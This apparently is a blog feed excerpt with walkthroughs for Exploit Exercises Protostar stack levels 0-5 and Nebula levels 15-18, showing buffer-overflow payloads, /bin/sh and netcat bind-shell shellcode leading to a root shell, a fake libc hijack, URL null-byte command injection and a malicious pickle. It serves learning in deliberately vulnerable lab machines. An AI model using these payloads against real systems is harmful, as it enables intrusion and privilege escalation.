    <link href="http://louisrli.github.io/blog/2012/08/24/protostar-stack1/"/>
    <updated>2012-08-24 00:00:00 +0100</updated>
    <id>http://louisrli.github.io/blog/2012/08/24/protostar-stack1</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>

<h1 id="solutions">Solutions</h1>
<h2 id="stack-level-4">Stack: Level 4</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>

<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code class="language-plaintext highlighter-rouge">main</code>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gdb ./stack4</code></pre></figure>

<!-- more -->

<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break main
Breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.
(gdb) run
Starting program: /opt/protostar/bin/stack4

Breakpoint 1, main (argc=1, argv=0xbffff874) at stack4/stack4.c:15
15      stack4/stack4.c: No such file or directory.
in stack4/stack4.c
(gdb) next
AAAA
16      in stack4/stack4.c
(gdb) info frame
Stack level 0, frame at 0xbffff7d0:
eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eacc76
source language c.
Arglist at 0xbffff7c8, args: argc=1, argv=0xbffff874
Locals at 0xbffff7c8, Previous frame's sp is 0xbffff7d0
Saved registers:
ebp at 0xbffff7c8, eip at 0xbffff7cc
(gdb) x/32xw $esp
0xbffff770:     0xbffff780      0xb7ec5165      0xbffff788      0xb7eaca75
0xbffff780:     0x41414141      0x08049500      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x080495ec      0xbffff7c8      0x08048449
0xbffff7a0:     0xb7fd7304      0xb7fd6ff4      0x08048430      0xbffff7c8
0xbffff7b0:     0xb7ec5365      0xb7ff1040      0x0804843b      0xb7fd6ff4
0xbffff7c0:     0x08048430      0x00000000      0xbffff848      0xb7eacc76
0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
(gdb) p 0xbffff7cc - 0xbffff780
= 76
(gdb) info address win
Symbol "win" is a function at address 0x80483f4.</code></pre></figure>

<ul>
  <li><code class="language-plaintext highlighter-rouge">info frame</code>: Shows the normal location of the saved instruction pointer, <code class="language-plaintext highlighter-rouge">eip</code>: <code class="language-plaintext highlighter-rouge">0xb7eacc76</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">x/32xw $esp</code>: Examines the current stack frame. The buffer starts at <code class="language-plaintext highlighter-rouge">0xbffff780</code> with <code class="language-plaintext highlighter-rouge">0x414141</code> (AAAA).</li>
  <li><code class="language-plaintext highlighter-rouge">p 0xbffff7cc - 0xbffff780</code>: Calculates <code class="language-plaintext highlighter-rouge">&amp;eip - &amp;buffer</code>, giving an offset to eip.
Using the offset calculated above, <code class="language-plaintext highlighter-rouge">eip</code> is redirected to the address of <code class="language-plaintext highlighter-rouge">win()</code> function.</li>
</ul>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print 'A'x76"</span><span class="si">)</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08"</span> | ./stack4
<span class="go">code flow successfully changed
Segmentation fault</span></code></pre></figure>

<h2 id="stack-level-5">Stack: Level 5</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack5">full</a>): Use buffer overflow to execute shellcode on a suid root program, <code class="language-plaintext highlighter-rouge">stack5</code>.</p>

<h3 id="utilities">Utilities</h3>

<p><code class="language-plaintext highlighter-rouge">~/nop</code>:</p>

<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="c1">#!/usr/bin/perl</span>
<span class="c1"># Prints argv[0] number of NOP instructions to stdout</span>
<span class="k">print</span> <span class="p">"</span><span class="se">\x90</span><span class="p">"</span><span class="nv">x$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">~/envaddr.c</code>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Prints the approximate address of an environmental variable</span>
<span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s not found</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s is at address %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>These utilities will be used in future solutions as well.</p>

<h3 id="solution">Solution</h3>

<h4 id="overview-1">Overview</h4>
<p>From a high level, this is our approach:</p>
<ol>
  <li>Store the shellcode in an environmental variable.</li>
  <li>Find the approximate address of the environmental variable on the stack.</li>
  <li>Overwriting the return address in <code class="language-plaintext highlighter-rouge">stack5</code> with the address of the environmental variable, we execute the shellcode.</li>
</ol>

<p>There are various ways to execute shellcode, but it’s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it’s larger than the buffer (64 bytes).</p>

<h4 id="executing-binsh">Executing <code class="language-plaintext highlighter-rouge">/bin/sh</code></h4>
<p>The shellcode is a modified version of the code from <em>Hacking: The Art of Exploitation</em>. It runs the command <code class="language-plaintext highlighter-rouge">/bin//sh -sli</code>.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span>

<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x68732f2f</span>   <span class="c1">; chars for /bin//sh</span>
<span class="nf">push</span> <span class="mh">0x6e69622f</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>

<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x736c692d</span>   <span class="c1">; -sli flags</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
<span class="nf">int</span> <span class="mh">0x80</span></code></pre></figure>

<p>We’ll overwrite the return address with the address of our shellcode environmental variable.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="si">$(</span>~/nop 100<span class="si">)$(</span><span class="nb">cat</span> /home/user/shell<span class="si">))</span>
<span class="gp">$</span><span class="w"> </span>~/envaddr SC
<span class="go">SC is at address 0xbffffefa
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xfa\xfe\xff\xbf"x25'</span><span class="si">)</span> | /opt/protostar/bin/stack5</code></pre></figure>

<p>Nothing happened! Let’s take a look with GDB.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[user@protostar:~]$ echo -n $(perl -e 'print "\xfa\xfe\xff\xbf"x25') &gt; /tmp/sc-shell
[user@protostar:~]$ gdb /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run &lt; /tmp/sc-shell
Starting program: /opt/protostar/bin/stack5 &lt; /tmp/sc-shell
Executing new program: /bin/dash

Program exited normally.</code></pre></figure>

<p>The shell opens, but it exits immediately. The shellcode is executing, but there’s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>

<h4 id="opening-a-shell-through-netcat">Opening a shell through netcat</h4>
<p>We know that our shellcode does run, but it can’t open a shell. However, there are a wide a wide array of exploits available besides running <code class="language-plaintext highlighter-rouge">/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We’ll use the netcat solution.</p>

<p>Using <a href="http://shell-storm.org/shellcode/files/shellcode-684.php">netcat shellcode</a>, we go through the same process <a href="https://gist.github.com/9e403a2889a07eeb84a9">(plaintext gist)</a>:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">23"</span> <span class="o">&gt;</span> ~/sc-nc-8080
<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span>~/nop 100<span class="si">)$(</span><span class="nb">cat</span> /home/user/sc-nc-8080<span class="si">))</span>
<span class="gp">$</span><span class="w"> </span>~/envaddr SC
<span class="go">SC is at address 0xbffffece
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xce\xfe\xff\xbf"x25'</span><span class="si">)</span> | /opt/protostar/bin/stack5
<span class="gp">&lt;waiting&gt;</span></code></pre></figure>

<p>On another machine, complete the newly waiting connection:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~]<span class="nv">$ </span>nc 192.168.1.10 8080
<span class="go">whoami
root</span></code></pre></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 0-3)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/"/>
    <updated>2012-08-18 00:00:00 +0100</updated>
    <id>http://louisrli.github.io/blog/2012/08/18/protostar-stack0</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>

<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>

<h1 id="solutions">Solutions</h1>
<h2 id="stack-level-0">Stack: Level 0</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x65"</span> | ./stack0
<span class="go">you have changed the 'modified' variable</span></code></pre></figure>

<h2 id="stack-level-1">Stack: Level 1</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./stack1 <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x64 . dcba"</span><span class="si">)</span>
<span class="go">you have correctly got the variable to the right value</span></code></pre></figure>

<!-- more -->
<h2 id="stack-level-2">Stack: Level 2</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print ax64"</span><span class="si">)</span><span class="se">\n\r\n\r</span><span class="s2">"</span><span class="si">)</span>
<span class="gp">$</span><span class="w"> </span>./stack2
<span class="go">you have correctly modified the variable</span></code></pre></figure>

<h2 id="stack-level-3">Stack: Level 3</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack3">full</a>): Overwrite a function pointer.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-d</span> ./stack3 | <span class="nb">grep </span>win
<span class="gp">08048424 &lt;win&gt;</span>:
<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print 'a'x64"</span><span class="si">)</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08"</span> | ./stack3
<span class="go">calling function pointer, jumping to 08048424
code flow successfully changed</span></code></pre></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 15-19)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/17/nebula2/"/>
    <updated>2012-08-17 00:00:00 +0100</updated>
    <id>http://louisrli.github.io/blog/2012/08/17/nebula2</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 – I was distracted by some other projects.</p>

<h2 id="level-15">Level 15</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level15">(full)</a>: <code class="language-plaintext highlighter-rouge">strace</code> on the binary reveals that it searches for libraries based on <a href="http://saintaardvarkthecarpeted.com/blog/archive/2005/08/_etc_ld_so_nohwcap.html">hardware capabilities</a>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>strace /home/flag15/flag15 2&gt;&amp;1 | less
<span class="c">...
</span><span class="go">stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfc25f24) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfc25f24) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfc25f24) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfc25f24) = -1 ENOENT (No such file or directory)
</span><span class="c">...</span></code></pre></figure>

<p>We want to either substitute our own version of libc, overriding the <code class="language-plaintext highlighter-rouge">puts()</code> call in <code class="language-plaintext highlighter-rouge">flag15</code>, or we want to execute code in the process. While the hard part isn’t creating our own shared library, we have to figure out how to prevent <code class="language-plaintext highlighter-rouge">libc</code> from being linked into our library. This solution executes code in the makeshift <code class="language-plaintext highlighter-rouge">libc.so</code>.</p>

<!-- more -->

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># /home/level15/flag.sh</span>
getflag <span class="o">&gt;</span> /home/flag15/getflag.log</code></pre></figure>

<p><br />
<code class="language-plaintext highlighter-rouge">~/version</code>: preventing an error about requiring <code class="language-plaintext highlighter-rouge">GLIBC_2.0</code>:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">GLIBC_2.0 { };</code></pre></figure>

<p><br />
<code class="language-plaintext highlighter-rouge">~/run.sh</code>: A makeshift Makefile that also executes our code.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash -ex</span>
<span class="c"># run.sh</span>
gcc <span class="nt">-fPIC</span> <span class="nt">-g</span> <span class="nt">-c</span> <span class="nt">-Wall</span> getflag.c
gcc <span class="nt">-shared</span> <span class="nt">-Wl</span>,-Bstatic,-soname,libc.so.6,--version-script,version <span class="nt">-o</span> libc.so.6 getflag.o  <span class="nt">-L</span>/usr/lib/i386-linux-gnu <span class="nt">-static-libgcc</span>
<span class="nb">mv</span> /home/level15/libc.so.6 /var/tmp/flag15/
/home/flag15/flag15
<span class="nb">cat</span> /home/flag15/getflag.log</code></pre></figure>

<p><br />
<code class="language-plaintext highlighter-rouge">~/getflag.c</code>: another interpretation of “libc,” but it happens to call <code class="language-plaintext highlighter-rouge">execv</code>.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="c1">// If this isn't here, we have an error about a missing symbol</span>
<span class="kt">void</span> <span class="nf">__cxa_finalize</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">d</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html</span>
<span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">))</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">args_new</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"/home/level15/flag.sh"</span> <span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args_new</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./run.sh
<span class="go">You have successfully executed getflag on a target account</span></code></pre></figure>

<h2 id="level-16">Level 16</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level16">(full)</a>: A Perl script running on port 1616 runs <code class="language-plaintext highlighter-rouge">egrep</code> with user input. It has some red herrings about a username and a password, but the goal is to execute arbitrary code.</p>

<p>This solution uses <a href="http://hakipedia.com/index.php/Poison_Null_Byte">null byte injection</a> to execute arbitrary commands on the target account.</p>

<p>There are two parts to the solution:</p>

<ol>
  <li>The Perl script converts all input to uppercase. We work around this by using a wildcard match, searching for <code class="language-plaintext highlighter-rouge">/tmp/RUN/</code> (our script) as <code class="language-plaintext highlighter-rouge">/*/RUN</code>.</li>
  <li>The Perl string doesn’t immediately allow us to execute arbitrary code. We have to terminate the string correctly with the right combination of <code class="language-plaintext highlighter-rouge">"</code>, “<code class="language-plaintext highlighter-rouge">\</code><code class="language-plaintext highlighter-rouge">", and </code>%00`. The last one is the null character in a URL.</li>
</ol>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># /home/level16/curl</span>
<span class="nb">echo</span> <span class="nv">$1</span>  <span class="c"># sanity check</span>
<span class="nv">url</span><span class="o">=</span><span class="s2">"http://localhost:1616/index.cgi?username=</span><span class="nv">$1</span><span class="s2">&amp;password=foo"</span>
<span class="nb">echo</span> <span class="nv">$uri</span>
curl <span class="nt">--globoff</span> <span class="nv">$3</span> <span class="s2">"</span><span class="nv">$uri</span><span class="s2">"</span>
<span class="nb">ls</span> /home/flag16 | <span class="nb">grep </span>getflag.log</code></pre></figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># /tmp/RUN</span>
getflag <span class="o">&gt;</span> /home/flag16/getflag.log</code></pre></figure>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>~/curl <span class="s1">' "`/*/RUN` %00 '</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/flag16/getflag.log
<span class="go">You have successfully executed getflag on a target account</span></code></pre></figure>

<h2 id="level-17">Level 17</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level17">(full)</a>: A Python script running on port 10007 loads pickled data from input.</p>

<p>The vulnerability of the Python <code class="language-plaintext highlighter-rouge">pickle</code> module is <a href="https://www.google.com/search?q=pickle+vulnerability">well-documented</a>. The Python docs say:</p>

<blockquote>
  <p>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source</p>
</blockquote>

<p><a href="http://nadiana.com/python-pickle-insecure">This article</a> gives us an example of malicious Pickle data.</p>

<p>Our pickled “data” goes in <code class="language-plaintext highlighter-rouge">~/cmd</code>:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">cos
system
(S' /tmp/run17'
tR.</code></pre></figure>

<p>We send the pickled data to the listening script.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /tmp/run17
<span class="gp">#</span><span class="o">!</span>/bin/bash
<span class="gp">getflag &gt;</span><span class="w"> </span>/home/flag17/getflag.log
<span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>cmd | nc localhost 10007
<span class="go">Accepted connection from 127.0.0.1:56228^C
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/flag17/getflag.log
<span class="go">You have successfully executed getflag on a target account</span></code></pre></figure>

<h3 id="interpreting-pickled-data">Interpreting Pickled data</h3>
<p>I was curious about the parts of the malicious pickle. I searched first for the <code class="language-plaintext highlighter-rouge">pickle</code> format specification, but I wasn’t able to find it. I was a bit surprised that I was only able to find <a href="http://peadrop.com/blog/2007/06/18/pickle-an-interesting-stack-language/">one article</a> related to the semantics of the pickle format. Part of our input is explained:</p>

<blockquote>
  <p>The ‘(‘ is simply a marker. It is a object in the stack that tells the tuple builder, ‘t’, when to stop. The tuple builder pops items from the stack until it reaches a marker. Then, it creates a tuple with these items and pushes this tuple back on the stack. You can use multiple markers to construct a nested tuple…</p>
</blockquote>

<h2 id="level-18">Level 18</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level18">(full)</a>: <code class="language-plaintext highlighter-rouge">flag18</code> is a program that mimics a login shell with various options such as <code class="language-plaintext highlighter-rouge">login</code>, <code class="language-plaintext highlighter-rouge">logout</code>, <code class="language-plaintext highlighter-rouge">shell</code> (see full description). The flag directory contains an unreadable password file.</p>

<h3 id="discussion">Discussion</h3>
<p>This problem was more complex than the others, given the number of options provided initially.</p>

<p>There are flags on <code class="language-plaintext highlighter-rouge">flag19</code> for a debug file and a verbose level. Using <code class="language-plaintext highlighter-rouge">-d /dev/tty</code> saves us some effort.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>/home/flag19/flag19 <span class="nt">-d</span> /dev/tty <span class="nt">-vvvvv</span>
<span class="go">login
got [login] as input
attempting to login</span></code></pre></figure>

<p>If we iterate through the possible commands, we can rule out some paths.</p>

<ul>
  <li>There’s no apparent path for dumping the contents of the password file through the code.</li>
  <li>The <code class="language-plaintext highlighter-rouge">notsupported()</code> and <code class="language-plaintext highlighter-rouge">setuser()</code> functions seem to deal with strings and buffers. These are potential solutions, but from a metagame perspective, Nebula solutions use shell exploits, not memory exploits.</li>
</ul>

<p>We can confirm this by trying playing around with buffer overflows and format strings:</p>

